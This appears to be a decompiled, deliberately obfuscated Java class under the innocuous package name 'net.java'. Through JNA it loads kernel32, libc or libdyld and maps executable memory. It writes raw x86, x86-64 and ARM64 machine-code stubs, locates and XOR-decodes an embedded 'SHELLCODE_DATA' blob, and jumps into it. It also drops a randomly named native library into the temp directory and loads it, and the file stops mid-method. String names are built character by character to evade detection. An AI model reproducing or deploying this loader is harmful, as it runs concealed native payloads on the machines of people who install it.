package net.java;

import com.sun.jna.Function;
import com.sun.jna.Memory;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Properties;
import java.util.Random;

public class g {
   private static Object a;
   private static Function a;
   private static Function b;
   private static Function c;
   private static int a = 1;
   private static int b = 2;
   private static int c = 4;
   private static int d = 32;
   private static int e = 2;
   private static int f = 4096;
   private static int g = 2;
   private static Object b;
   private static Function d;
   private static Function e;
   private static Function f;

   private static boolean b() {
      try {
         ClassLoader var10000 = g.class.getClassLoader();
         StringBuilder var0;
         (var0 = new StringBuilder()).append('c');
         var0.append('o');
         var0.append('m');
         var0.append('.');
         var0.append('s');
         var0.append('u');
         var0.append('n');
         var0.append('.');
         var0.append('j');
         var0.append('n');
         var0.append('a');
         var0.append('.');
         var0.append('N');
         var0.append('a');
         var0.append('t');
         var0.append('i');
         var0.append('v');
         var0.append('e');
         var10000.loadClass(var0.toString());
         return true;
      } catch (Throwable var1) {
         return false;
      }
   }

   private static void a(byte[] var0, int var1, int var2) {
      var0[var1 + 3] = (byte)(var2 >>> 24);
      var0[var1 + 2] = (byte)(var2 >>> 16);
      var0[var1 + 1] = (byte)(var2 >>> 8);
      var0[var1] = (byte)var2;
   }

   private static void a(byte[] var0, int var1, long var2) {
      var0[var1 + 7] = (byte)((int)(var2 >>> 56));
      var0[var1 + 6] = (byte)((int)(var2 >>> 48));
      var0[var1 + 5] = (byte)((int)(var2 >>> 40));
      var0[var1 + 4] = (byte)((int)(var2 >>> 32));
      var0[var1 + 3] = (byte)((int)(var2 >>> 24));
      var0[var1 + 2] = (byte)((int)(var2 >>> 16));
      var0[var1 + 1] = (byte)((int)(var2 >>> 8));
      var0[var1] = (byte)((int)var2);
   }

   private static long a(byte[] var0, int var1) {
      return 0L | (long)(var0[var1 + 7] & 255) << 56 | (long)(var0[var1 + 6] & 255) << 48 | (long)(var0[var1 + 5] & 255) << 40 | (long)(var0[var1 + 4] & 255) << 32 | (long)(var0[var1 + 3] & 255) << 24 | (long)((var0[var1 + 2] & 255) << 16) | (long)((var0[var1 + 1] & 255) << 8) | (long)(var0[var1] & 255);
   }

   private static int a(byte[] var0, int var1) {
      return 0 | (var0[var1 + 3] & 255) << 24 | (var0[var1 + 2] & 255) << 16 | (var0[var1 + 1] & 255) << 8 | var0[var1] & 255;
   }

   private static int b(byte[] var0, int var1) {
      if (var1 < 0) {
         return 0;
      } else {
         long var2 = 0L;
         boolean var4 = false;
         long var5 = 0L;

         for(int var7 = 0; var7 < var1; ++var7) {
            if (var4) {
               if (var0[var7] != 0) {
                  var4 = false;
                  if ((long)(var7 - 1) - var2 > 512L) {
                     var5 = var2;
                  }
               }
            } else if (var0[var7] == 0) {
               var2 = (long)var7;
               var4 = true;
            }
         }

         long var8;
         if (l.g()) {
            var8 = 16384L;
         } else {
            var8 = 4096L;
         }

         long var10;
         if ((var10 = var5 / var8) * var8 < var5) {
            ++var10;
         }

         return (int)(var10 * var8);
      }
   }

   private static boolean a(byte[] var0) {
      byte[] var1 = new byte[]{-1, -18, -35, -52, -69, -86, -103, -120};
      int var3 = l.a((Object)var0, (Object)var1);

      for(int var2 = 0; var2 < 8; ++var2) {
         var1[var2] = 0;
      }

      return var3 <= 0 || var3 >= 2048;
   }

   private static int a(byte[] var0) {
      byte[] var1 = new byte[]{-35, -52, -69, -86};
      byte[] var2 = new byte[]{-1, -18, -35, -52, -69, -86, -103, -120};

      try {
         byte var3;
         int var4;
         boolean var5;
         if ((var4 = l.a((Object)(new Object[]{var0, 2048, var2}))) < 0) {
            if ((var4 = l.a((Object)(new Object[]{var0, 2048, var1}))) < 0) {
               return -1;
            }

            var3 = 20;
            var5 = true;
         } else {
            var3 = 40;
            var5 = false;
         }

         long var6;
         long var8;
         if (var5) {
            var6 = (long)a(var0, var4 + 4);
            var8 = (long)a(var0, var4 + 8);
         } else {
            var6 = a(var0, var4 + 8);
            var8 = a(var0, var4 + 16);
         }

         long var10 = var6 + var8;
         long var12 = (long)(var4 + var3);
         long var14 = (long)var4 + (long)var3 + var10;
         if (var6 <= 0L) {
            long var16;
            if (var5) {
               var16 = (long)a(var0, (int)(var12 - 4L)) + var14 - var8;
            } else {
               var16 = a(var0, (int)(var12 - 8L)) + var14 - var8;
            }

            int var20 = (int)var16;
            return var20;
         }
      } finally {
         int var21;
         for(var21 = 0; var21 < 8; ++var21) {
            var2[var21] = 0;
         }

         for(var21 = 0; var21 < 4; ++var21) {
            var1[var21] = 0;
         }

      }

      return -2;
   }

   private static int a(Object var0, Object var1) {
      byte[] var96 = (byte[])var0;
      byte[] var99 = (byte[])var1;
      long var10 = 0L;
      long var12 = 0L;
      long var14 = 0L;

      long var4;
      label2396: {
         int var100;
         label2413: {
            label2399: {
               Throwable var10000;
               label2400: {
                  label2401: {
                     int var2;
                     boolean var10001;
                     try {
                        if ((var2 = b(var96, var96.length - 4096)) == 0) {
                           break label2401;
                        }
                     } catch (Throwable var95) {
                        var10000 = var95;
                        var10001 = false;
                        break label2400;
                     }

                     long var16;
                     long var18;
                     label2402: {
                        try {
                           while(var10 < (long)(var96.length + (var99 == null ? 0 : var99.length))) {
                              var10 += 4096L;
                           }

                           var16 = 0L;

                           for(var18 = var10; var16 < (long)var2; var18 -= 4096L) {
                              var16 += 4096L;
                           }

                           var10 += 16384L;
                           if ((var4 = a((Object)(new Object[]{0L, var10, 8192, 4}))) != 0L) {
                              break label2402;
                           }
                        } catch (Throwable var94) {
                           var10000 = var94;
                           var10001 = false;
                           break label2400;
                        }

                        if (var4 != 0L) {
                           a(var4, var10);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        return 207;
                     }

                     long var6;
                     try {
                        if ((var6 = a((Object)(new Object[]{var4, var16, 4096, 4}))) == 0L) {
                           break label2396;
                        }
                     } catch (Throwable var90) {
                        var10000 = var90;
                        var10001 = false;
                        break label2400;
                     }

                     long var8;
                     try {
                        if ((var8 = a((Object)(new Object[]{var4 + var16, var18, 4096, 4}))) == 0L) {
                           break label2399;
                        }
                     } catch (Throwable var89) {
                        var10000 = var89;
                        var10001 = false;
                        break label2400;
                     }

                     if (var8 != var4 + var16) {
                        if (var4 != 0L) {
                           a(var4, var10);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        return 210;
                     }

                     label2405: {
                        try {
                           a(var4, var96, var96.length);
                           if (var99 != null) {
                              a(var4 + (long)var96.length, var99, var99.length);
                           }

                           if (a((Object)(new Object[]{var6, var16, 32, null})) != Boolean.TRUE) {
                              break label2405;
                           }
                        } catch (Throwable var93) {
                           var10000 = var93;
                           var10001 = false;
                           break label2400;
                        }

                        int var101;
                        label2406: {
                           try {
                              if ((var101 = a(var96)) != -1) {
                                 break label2406;
                              }
                           } catch (Throwable var92) {
                              var10000 = var92;
                              var10001 = false;
                              break label2400;
                           }

                           if (var4 != 0L) {
                              a(var4, var10);
                           }

                           if (0L != 0L) {
                              a(0L, 4096L);
                           }

                           if (0L != 0L) {
                              a(0L, 4096L);
                           }

                           return 212;
                        }

                        if (var101 == -2) {
                           if (var4 != 0L) {
                              a(var4, var10);
                           }

                           if (0L != 0L) {
                              a(0L, 4096L);
                           }

                           if (0L != 0L) {
                              a(0L, 4096L);
                           }

                           return 213;
                        }

                        byte[] var103;
                        try {
                           var103 = new byte[]{-13, 15, 30, -6, 83, 87, 86, 72, -119, -53, 72, -125, -20, 32, 72, -117, 123, 8, 72, -117, 115, 16, 72, -117, 83, 24, 72, -117, 75, 32, -1, 19, 72, -119, 67, 40, 49, -64, 72, -125, -60, 32, 94, 95, 91, -61};
                           byte[] var3 = new byte[]{85, -117, -20, 86, -117, 117, 8, -1, 118, 16, -1, 118, 12, -1, 118, 8, -1, 118, 4, -1, 22, -125, -60, 16, -119, 70, 20, 51, -64, 94, 93, -61};
                           byte[] var104 = new byte[]{-13, 15, 31, -8, -2, 7, 0, -7, -13, 3, 0, -86, 2, -116, 65, -87, 8, 0, 64, -7, 0, -124, 64, -87, 0, 1, 63, -42, 96, 22, 0, -7, -32, 3, 31, -86, -2, 7, 64, -7, -13, 7, 65, -8, -64, 3, 95, -42};
                           var12 = a((Object)(new Object[]{0L, 4096L, 12288, 4}));
                           if (l.g()) {
                              a(var12, var104, 48);
                           } else if (l.f()) {
                              a(var12, var103, 46);
                           } else if (l.e()) {
                              a(var12, var3, 32);
                           }

                           a((Object)(new Object[]{var12, 4096L, 32, null}));
                           var14 = a((Object)(new Object[]{0L, 4096L, 12288, 4}));
                           var103 = new byte[48];
                           boolean var97;
                           if (var97 = a(var96)) {
                              a(var103, 0, (int)(var4 + (long)var101));
                              a(var103, 4, (int)(var4 + (long)var101));
                              a(var103, 8, (int)var16);
                           } else {
                              a(var103, 0, var4 + (long)var101);
                              a(var103, 8, var4 + (long)var101);
                              a(var103, 16, var16);
                           }

                           a(var14, var103, 48);
                           Pointer var102;
                           if ((var102 = Function.getFunction(new Pointer(var12)).invokePointer(new Object[]{new Pointer(var14)})) != null) {
                              Pointer.nativeValue(var102);
                           }

                           (new Pointer(var14)).read(0L, var103, 0, 48);
                           if (var97) {
                              var100 = a(var103, 20);
                              break label2413;
                           }
                        } catch (Throwable var91) {
                           var10000 = var91;
                           var10001 = false;
                           break label2400;
                        }

                        try {
                           var100 = (int)a(var103, 40);
                        } catch (Throwable var88) {
                           var10000 = var88;
                           var10001 = false;
                           break label2400;
                        }

                        if (var14 != 0L) {
                           a(var14, 4096L);
                        }

                        if (var12 != 0L) {
                           a(var12, 4096L);
                        }

                        return var100;
                     }

                     if (var4 != 0L) {
                        a(var4, var10);
                     }

                     if (0L != 0L) {
                        a(0L, 4096L);
                     }

                     if (0L != 0L) {
                        a(0L, 4096L);
                     }

                     return 211;
                  }

                  if (0L != 0L) {
                     a(0L, 0L);
                  }

                  if (0L != 0L) {
                     a(0L, 4096L);
                  }

                  if (0L != 0L) {
                     a(0L, 4096L);
                  }

                  return 206;
               }

               Throwable var98 = var10000;
               if (var14 != 0L) {
                  a(var14, 4096L);
               }

               if (var12 != 0L) {
                  a(var12, 4096L);
               }

               throw var98;
            }

            if (var4 != 0L) {
               a(var4, var10);
            }

            if (0L != 0L) {
               a(0L, 4096L);
            }

            if (0L != 0L) {
               a(0L, 4096L);
            }

            return 209;
         }

         if (var14 != 0L) {
            a(var14, 4096L);
         }

         if (var12 != 0L) {
            a(var12, 4096L);
         }

         return var100;
      }

      if (var4 != 0L) {
         a(var4, var10);
      }

      if (0L != 0L) {
         a(0L, 4096L);
      }

      if (0L != 0L) {
         a(0L, 4096L);
      }

      return 208;
   }

   private static Object a() {
      if (a == null) {
         StringBuilder var0;
         (var0 = new StringBuilder()).append('k');
         var0.append('e');
         var0.append('r');
         var0.append('n');
         var0.append('e');
         var0.append('l');
         var0.append('3');
         var0.append('2');
         a = NativeLibrary.getInstance(var0.toString());
      }

      return a;
   }

   private static void a(long var0, byte[] var2, int var3) {
      (new Pointer(var0)).write(0L, var2, 0, var3);
   }

   private static Object a(Object var0) {
      Object[] var7;
      long var2 = (Long)(var7 = (Object[])var0)[0];
      long var4 = (Long)var7[1];
      int var1 = (Integer)var7[2];
      int[] var8 = (int[])var7[3];
      if (a == null) {
         a = ((NativeLibrary)a()).getFunction(b());
      }

      Memory var6 = new Memory(4L);
      Pointer var9 = a.invokePointer(new Object[]{new Pointer(var2), new Pointer(var4), var1, var6});
      if (var8 != null) {
         var8[0] = var6.getInt(0L);
      }

      if (var9 == null) {
         return Boolean.FALSE;
      } else {
         return Pointer.nativeValue(var9) == 1L ? Boolean.TRUE : Boolean.FALSE;
      }
   }

   private static boolean a(long var0, long var2) {
      if (b == null) {
         b = ((NativeLibrary)a()).getFunction(e());
      }

      Pointer var4;
      if ((var4 = b.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2), 32768})) == null) {
         return false;
      } else {
         return Pointer.nativeValue(var4) == 1L;
      }
   }

   private static long a(Object var0) {
      Object[] var6;
      long var2 = (Long)(var6 = (Object[])var0)[0];
      long var4 = (Long)var6[1];
      int var1 = (Integer)var6[2];
      int var7 = (Integer)var6[3];
      if (c == null) {
         c = ((NativeLibrary)a()).getFunction(c());
      }

      return Pointer.nativeValue(c.invokePointer(new Object[]{new Pointer(var2), new Pointer(var4), var1, var7}));
   }

   private static int b(Object var0, Object var1) {
      byte[] var48 = (byte[])var0;
      byte[] var50 = (byte[])var1;
      long var8 = 0L;

      int var2;
      Throwable var10000;
      boolean var10001;
      label766: {
         try {
            if ((var2 = b(var48, var48.length - 4096)) != 0) {
               break label766;
            }
         } catch (Throwable var47) {
            var10000 = var47;
            var10001 = false;
            throw var10000;
         }

         if (0L != 0L) {
            a(0L, 0L);
         }

         return 206;
      }

      long var4;
      label767: {
         long var10;
         try {
            while(var8 < (long)(var48.length + (var50 == null ? 0 : var50.length))) {
               var8 += 4096L;
            }

            for(var10 = 0L; var10 < (long)var2; var10 += 4096L) {
            }

            var8 += 16384L;
            Object[] var13;
            long var14 = (Long)(var13 = (Object[])(new Object[]{0L, var8, a | b, d | e, -1, 0}))[0];
            long var16 = (Long)var13[1];
            var2 = (Integer)var13[2];
            int var3 = (Integer)var13[3];
            int var6 = (Integer)var13[4];
            int var7 = (Integer)var13[5];
            if (f == null) {
               f = ((NativeLibrary)b()).getFunction(h());
            }

            Pointer var51;
            if ((var4 = (var51 = f.invokePointer(new Object[]{new Pointer(var14), new Pointer(var16), var2, var3, var6, new Pointer((long)var7)})) == null ? 0L : Pointer.nativeValue(var51)) == 0L) {
               break label767;
            }
         } catch (Throwable var46) {
            var10000 = var46;
            var10001 = false;
            throw var10000;
         }

         label770: {
            try {
               a(var4, var48, var48.length);
               if (var50 != null) {
                  a(var4 + (long)var48.length, var50, var50.length);
               }

               int var52 = a | c;
               if (d == null) {
                  d = ((NativeLibrary)b()).getFunction(g());
               }

               Pointer var17;
               if (((var17 = d.invokePointer(new Object[]{new Pointer(var4), new Pointer(var10), var52})) == null ? 0 : (int)Pointer.nativeValue(var17)) == 0) {
                  break label770;
               }
            } catch (Throwable var45) {
               var10000 = var45;
               var10001 = false;
               throw var10000;
            }

            if (var4 != 0L) {
               a(var4, var8);
            }

            return 211;
         }

         label772: {
            int var49;
            try {
               if ((var49 = a(var48)) == -1) {
                  break label772;
               }
            } catch (Throwable var44) {
               var10000 = var44;
               var10001 = false;
               throw var10000;
            }

            if (var49 == -2) {
               if (var4 != 0L) {
                  a(var4, var8);
               }

               return 213;
            }

            try {
               var49 = ((Number)b((Object)(new Object[]{var4 + (long)var49, var4 + (long)var49, var10}))).intValue();
               return var49;
            } catch (Throwable var43) {
               var10000 = var43;
               var10001 = false;
               throw var10000;
            }
         }

         if (var4 != 0L) {
            a(var4, var8);
         }

         return 212;
      }

      if (var4 != 0L) {
         a(var4, var8);
      }

      return 207;
   }

   private static Object b() {
      if (b == null) {
         StringBuilder var0;
         try {
            (var0 = new StringBuilder()).append('l');
            var0.append('i');
            var0.append('b');
            var0.append('c');
            b = NativeLibrary.getInstance(var0.toString());
         } catch (Throwable var2) {
            try {
               (var0 = new StringBuilder()).append('l');
               var0.append('i');
               var0.append('b');
               var0.append('c');
               var0.append('.');
               var0.append('s');
               var0.append('o');
               var0.append('.');
               var0.append('6');
               b = NativeLibrary.getInstance(var0.toString());
            } catch (Throwable var1) {
               (var0 = new StringBuilder()).append('l');
               var0.append('i');
               var0.append('b');
               var0.append('c');
               var0.append('.');
               var0.append('s');
               var0.append('o');
               b = NativeLibrary.getInstance(var0.toString());
            }
         }
      }

      return b;
   }

   private static int a(long var0, long var2) {
      if (e == null) {
         e = ((NativeLibrary)b()).getFunction(f());
      }

      Pointer var4;
      return (var4 = e.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2)})) == null ? 0 : (int)Pointer.nativeValue(var4);
   }

   private static Object b(Object var0) {
      Object[] var7;
      long var1 = (Long)(var7 = (Object[])var0)[0];
      long var3 = (Long)var7[1];
      long var5 = (Long)var7[2];
      Pointer var8;
      return (var8 = Function.getFunction(new Pointer(var1)).invokePointer(new Object[]{new Pointer(var3), new Pointer(var5), new Pointer(0L), new Pointer(0L)})) == null ? 0 : Pointer.nativeValue(var8);
   }

   private static int c(Object var0, Object var1) {
      byte[] var50 = (byte[])var0;
      byte[] var52 = (byte[])var1;
      long var8 = 0L;

      label761: {
         int var2;
         Throwable var10000;
         boolean var10001;
         try {
            if ((var2 = b(var50, var50.length - 4096)) == 0) {
               break label761;
            }
         } catch (Throwable var49) {
            var10000 = var49;
            var10001 = false;
            throw var10000;
         }

         long var4;
         label762: {
            long var10;
            try {
               while(var8 < (long)(var50.length + (var52 == null ? 0 : var52.length))) {
                  var8 += 4096L;
               }

               for(var10 = 0L; var10 < (long)var2; var10 += 4096L) {
               }

               var8 += 16384L;
               Object[] var13;
               long var14 = (Long)(var13 = (Object[])(new Object[]{0L, var8, a | b, f | g, -1, 0}))[0];
               long var16 = (Long)var13[1];
               var2 = (Integer)var13[2];
               int var3 = (Integer)var13[3];
               int var6 = (Integer)var13[4];
               int var7 = (Integer)var13[5];
               if (f == null) {
                  f = (Function)a(h());
               }

               Pointer var53 = f.invokePointer(new Object[]{new Pointer(var14), new Pointer(var16), var2, var3, var6, new Pointer((long)var7)});
               long var18 = 0L;
               if (var53 != null) {
                  var18 = Pointer.nativeValue(var53);
               }

               var4 = var18;
               if (var18 == 0L) {
                  break label762;
               }
            } catch (Throwable var48) {
               var10000 = var48;
               var10001 = false;
               throw var10000;
            }

            label765: {
               try {
                  a(var4, var50, var50.length);
                  if (var52 != null) {
                     a(var4 + (long)var50.length, var52, var52.length);
                  }

                  int var54 = a | c;
                  if (d == null) {
                     d = (Function)a(g());
                  }

                  Pointer var17;
                  if (((var17 = d.invokePointer(new Object[]{new Pointer(var4), new Pointer(var10), var54})) == null ? 0 : (int)Pointer.nativeValue(var17)) == 0) {
                     break label765;
                  }
               } catch (Throwable var47) {
                  var10000 = var47;
                  var10001 = false;
                  throw var10000;
               }

               if (var4 != 0L) {
                  b(var4, var8);
               }

               return 211;
            }

            label767: {
               int var51;
               try {
                  if ((var51 = a(var50)) == -1) {
                     break label767;
                  }
               } catch (Throwable var46) {
                  var10000 = var46;
                  var10001 = false;
                  throw var10000;
               }

               if (var51 == -2) {
                  if (var4 != 0L) {
                     b(var4, var8);
                  }

                  return 213;
               }

               try {
                  var51 = ((Number)b((Object)(new Object[]{var4 + (long)var51, var4 + (long)var51, var10}))).intValue();
                  return var51;
               } catch (Throwable var45) {
                  var10000 = var45;
                  var10001 = false;
                  throw var10000;
               }
            }

            if (var4 != 0L) {
               b(var4, var8);
            }

            return 212;
         }

         if (var4 != 0L) {
            b(var4, var8);
         }

         return 207;
      }

      if (0L != 0L) {
         b(0L, 0L);
      }

      return 206;
   }

   private static Object a(String var0) {
      try {
         return NativeLibrary.getInstance(d()).getFunction(var0);
      } catch (Throwable var3) {
         StringBuilder var1;
         try {
            (var1 = new StringBuilder()).append('/');
            var1.append('u');
            var1.append('s');
            var1.append('r');
            var1.append('/');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            var1.append('/');
            var1.append('s');
            var1.append('y');
            var1.append('s');
            var1.append('t');
            var1.append('e');
            var1.append('m');
            var1.append('/');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            var1.append('d');
            var1.append('y');
            var1.append('l');
            var1.append('d');
            var1.append('.');
            var1.append('d');
            var1.append('y');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            return NativeLibrary.getInstance(var1.toString()).getFunction(var0);
         } catch (Throwable var2) {
            (var1 = new StringBuilder()).append('/');
            var1.append('u');
            var1.append('s');
            var1.append('r');
            var1.append('/');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            var1.append('/');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            var1.append('S');
            var1.append('y');
            var1.append('s');
            var1.append('t');
            var1.append('e');
            var1.append('m');
            var1.append('.');
            var1.append('B');
            var1.append('.');
            var1.append('d');
            var1.append('y');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            return NativeLibrary.getInstance(var1.toString()).getFunction(var0);
         }
      }
   }

   private static int b(long var0, long var2) {
      if (e == null) {
         e = (Function)a(f());
      }

      Pointer var4;
      return (var4 = e.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2)})) == null ? 0 : (int)Pointer.nativeValue(var4);
   }

   private static long a(int var0) {
      try {
         Process var1 = null;
         int var2 = var0;
         int var3 = a();
         StringBuilder var16;
         if (var0 == var3 && !l.g()) {
            Runtime var10000 = Runtime.getRuntime();
            String[] var10001 = new String[2];
            (var16 = new StringBuilder()).append('p');
            var16.append('i');
            var16.append('n');
            var16.append('g');
            var10001[0] = var16.toString();
            (var16 = new StringBuilder()).append('l');
            var16.append('o');
            var16.append('c');
            var16.append('a');
            var16.append('l');
            var16.append('h');
            var16.append('o');
            var16.append('s');
            var16.append('t');
            var10001[1] = var16.toString();
            Process var12;
            var1 = var12 = var10000.exec(var10001);

            try {
               var2 = ((Number)Process.class.getMethod(a()).invoke(var12)).intValue();
            } catch (Throwable var10) {
               try {
                  Field var15;
                  (var15 = var12.getClass().getDeclaredField(a())).setAccessible(true);
                  var2 = var15.getInt(var12);
               } catch (Exception var9) {
                  var9.printStackTrace();
                  return 0L;
               }
            }
         }

         String[] var10002 = new String[3];
         (var16 = new StringBuilder()).append('v');
         var16.append('m');
         var16.append('m');
         var16.append('a');
         var16.append('p');
         var10002[0] = var16.toString();
         (var16 = new StringBuilder()).append('-');
         var16.append('w');
         var10002[1] = var16.toString();
         var10002[2] = Integer.toString(var2);
         Process var17 = (new ProcessBuilder(var10002)).start();
         BufferedReader var18 = new BufferedReader(new InputStreamReader(var17.getInputStream()));
         long var5 = 0L;

         while(true) {
            String var13;
            do {
               do {
                  do {
                     if ((var13 = var18.readLine()) == null) {
                        if (var1 != null) {
                           try {
                              var1.destroyForcibly();
                           } catch (Throwable var7) {
                              var1.destroy();
                           }
                        }

                        return var5;
                     }
                  } while(var5 != 0L);
               } while(!var13.contains(d()));

               (var16 = new StringBuilder()).append('_');
               var16.append('_');
               var16.append('T');
               var16.append('E');
               var16.append('X');
               var16.append('T');
            } while(!var13.startsWith(var16.toString()));

            (var16 = new StringBuilder()).append('\\');
            var16.append('s');
            var16.append('+');
            String[] var14 = var13.split(var16.toString());

            for(var3 = 0; var3 < var14.length; ++var3) {
               int var4 = var14[var3].indexOf(45);

               try {
                  var5 = Long.parseLong(var14[var3].substring(0, var4), 16);
               } catch (Exception var8) {
               }
            }
         }
      } catch (Throwable var11) {
         var11.printStackTrace();
         return 0L;
      }
   }

   private static int a() {
      try {
         ClassLoader var10000 = g.class.getClassLoader();
         StringBuilder var1;
         (var1 = new StringBuilder()).append('j');
         var1.append('a');
         var1.append('v');
         var1.append('a');
         var1.append('.');
         var1.append('l');
         var1.append('a');
         var1.append('n');
         var1.append('g');
         var1.append('.');
         var1.append('m');
         var1.append('a');
         var1.append('n');
         var1.append('a');
         var1.append('g');
         var1.append('e');
         var1.append('m');
         var1.append('e');
         var1.append('n');
         var1.append('t');
         var1.append('.');
         var1.append('M');
         var1.append('a');
         var1.append('n');
         var1.append('a');
         var1.append('g');
         var1.append('e');
         var1.append('m');
         var1.append('e');
         var1.append('n');
         var1.append('t');
         var1.append('F');
         var1.append('a');
         var1.append('c');
         var1.append('t');
         var1.append('o');
         var1.append('r');
         var1.append('y');
         Class var4 = var10000.loadClass(var1.toString());
         (var1 = new StringBuilder()).append('g');
         var1.append('e');
         var1.append('t');
         var1.append('R');
         var1.append('u');
         var1.append('n');
         var1.append('t');
         var1.append('i');
         var1.append('m');
         var1.append('e');
         var1.append('M');
         var1.append('X');
         var1.append('B');
         var1.append('e');
         var1.append('a');
         var1.append('n');
         Method var0 = var4.getDeclaredMethod(var1.toString());
         var10000 = g.class.getClassLoader();
         (var1 = new StringBuilder()).append('j');
         var1.append('a');
         var1.append('v');
         var1.append('a');
         var1.append('.');
         var1.append('l');
         var1.append('a');
         var1.append('n');
         var1.append('g');
         var1.append('.');
         var1.append('m');
         var1.append('a');
         var1.append('n');
         var1.append('a');
         var1.append('g');
         var1.append('e');
         var1.append('m');
         var1.append('e');
         var1.append('n');
         var1.append('t');
         var1.append('.');
         var1.append('R');
         var1.append('u');
         var1.append('n');
         var1.append('t');
         var1.append('i');
         var1.append('m');
         var1.append('e');
         var1.append('M');
         var1.append('X');
         var1.append('B');
         var1.append('e');
         var1.append('a');
         var1.append('n');
         var4 = var10000.loadClass(var1.toString());
         (var1 = new StringBuilder()).append('g');
         var1.append('e');
         var1.append('t');
         var1.append('N');
         var1.append('a');
         var1.append('m');
         var1.append('e');
         String var3;
         return Integer.parseInt((var3 = (String)var4.getDeclaredMethod(var1.toString()).invoke(var0.invoke((Object)null))).substring(0, var3.indexOf(64)));
      } catch (Exception var2) {
         var2.printStackTrace();
         return 0;
      }
   }

   private static int b(byte[] var0) {
      byte[] var1 = null;
      if (l.a()) {
         if (l.g()) {
            var1 = k.h();
         } else if (l.e()) {
            var1 = k.f();
         } else if (l.f()) {
            var1 = k.g();
         }
      } else if (!l.c() && !l.d()) {
         if (l.b()) {
            if (l.g()) {
               var1 = k.a();
            } else if (l.f()) {
               var1 = k.b();
            }
         }
      } else if (l.g()) {
         var1 = k.e();
      } else if (l.e()) {
         var1 = k.d();
      } else if (l.f()) {
         var1 = k.c();
      }

      Random var2 = new Random();
      String var8 = Long.toHexString(var2.nextLong()) + '-' + Long.toHexString(var2.nextLong());
      StringBuilder var3;
      (var3 = new StringBuilder()).append('j');
      var3.append('a');
      var3.append('v');
      var3.append('a');
      var3.append('.');
      var3.append('i');
      var3.append('o');
      var3.append('.');
      var3.append('t');
      var3.append('m');
      var3.append('p');
      var3.append('d');
      var3.append('i');
      var3.append('r');
      String var10 = System.getProperty(var3.toString());
      l.a.put(System.class, l.class);
      File var9 = new File(var10, System.mapLibraryName(var8));
      l.b((Object)(new Object[]{var9, var1}));
      System.load(var9.getAbsolutePath());
      l.a.remove(System.class);
      if (l.b()) {
         long var4 = (long)(var0.length - 4096 + 48);
         long var6 = a(a());
         a(var0, (int)var4, var6);
      }

      Object var11;
      if ((var11 = l.n(var0)) != null && var11 instanceof long[]) {
         int var5;
         if ((var5 = (int)((long[])var11)[0]) == 0) {
            Thread.sleep(350L);
         }

         return var5;
      } else {
         return 256;
      }
   }

   private static byte[] a() {
      byte var0 = -1;
      if (l.g()) {
         var0 = 0;
      } else if (l.e()) {
         var0 = 1;
      } else if (l.f()) {
         var0 = 2;
      }

      byte[] var1 = l.b(l.b());
      ByteArrayInputStream var6 = new ByteArrayInputStream(var1);
      DataInputStream var7 = new DataInputStream(var6);

      try {
         for(int var2 = 0; var2 < 3; ++var2) {
            byte var3 = var7.readByte();
            int var4 = var7.readInt();
            if (var3 == var0) {
               byte[] var8 = new byte[var4];
               var7.readFully(var8);
               return var8;
            }

            var7.skip((long)var4);
         }
      } catch (Exception var5) {
         var5.printStackTrace();
      }

      return null;
   }

   public static boolean a() {
      byte[] var0 = null;

      try {
         byte[] var1;
         boolean var2 = a(var1 = a());
         byte[] var4 = new byte[]{83, 72, 69, 76, 76, 67, 79, 68, 69, 95, 68, 65, 84, 65, 95, 95, 83, 72, 69, 76, 76, 67, 79, 68, 69, 95, 68, 65, 84, 65, 95, 95};
         int var3 = l.a((Object)var1, (Object)var4);

         int var5;
         for(var5 = 0; var5 < 32; ++var5) {
            var4[var5] = 0;
         }

         System.arraycopy(var1, 0, var1, var3, 24);

         for(var5 = var3; var5 < var3 + 24; ++var5) {
            var1[var5] = (byte)(var1[var5] ^ 153);
         }

         a(var1, var3 + 24, (long)var1.length);
         byte[] var20 = l.a(var1, var1.length + 4096);
         long var6;
         if (l.a()) {
            var6 = (long)var1.length;
            if (var2) {
               a(var20, (int)var6, 2);
            } else {
               a(var20, (int)var6, 2L);
            }
         } else if (l.b()) {
            var6 = (long)var1.length;
            if (var2) {
               a(var20, (int)var6, 3);
            } else {
               a(var20, (int)var6, 3L);
            }
         } else if (l.c() || l.d()) {
            var6 = (long)var1.length;
            if (var2) {
               a(var20, (int)var6, 1);
            } else {
               a(var20, (int)var6, 1L);
            }
         }

         var0 = var20;
         if (a(var20)) {
            var3 = var20.length - 4096 + 20;
            a(var20, var3, 2);
         } else {
            var3 = var20.length - 4096 + 40;
            a(var20, var3, 2L);
         }

         if (l.b()) {
            long var17 = (long)(var20.length - 4096 + 48);
            long var19 = a(a());
            a(var20, (int)var17, var19);
         }
      } catch (Throwable var16) {
         var16.printStackTrace();
      }

      l.a.put(Properties.class, l.class);
      if (l.a()) {
         label119: {
            if (b()) {
               try {
                  if (a(var0, (Object)null) == 0) {
                     break label119;
                  }
               } catch (Throwable var15) {
                  var15.printStackTrace();
               }
            }

            try {
               if (b(var0) == 0) {
               }
            } catch (Throwable var12) {
               var12.printStackTrace();
            }
         }
      } else if (!l.c() && !l.d()) {
         if (l.b()) {
            label104: {
               if (b()) {
                  try {
                     if (c(var0, (Object)null) == 0) {
                        break label104;
                     }
                  } catch (Throwable var13) {
                     var13.printStackTrace();
                  }
               }

               try {
                  if (b(var0) == 0) {
                  }
               } catch (Throwable var10) {
                  var10.printStackTrace();
               }
            }
         }
      } else {
         label154: {
            if (b()) {
               try {
                  if (b(var0, (Object)null) == 0) {
                     break label154;
                  }
               } catch (Throwable var14) {
                  var14.printStackTrace();
               }
            }

            try {
               if (b(var0) == 0) {
               }
            } catch (Throwable var11) {
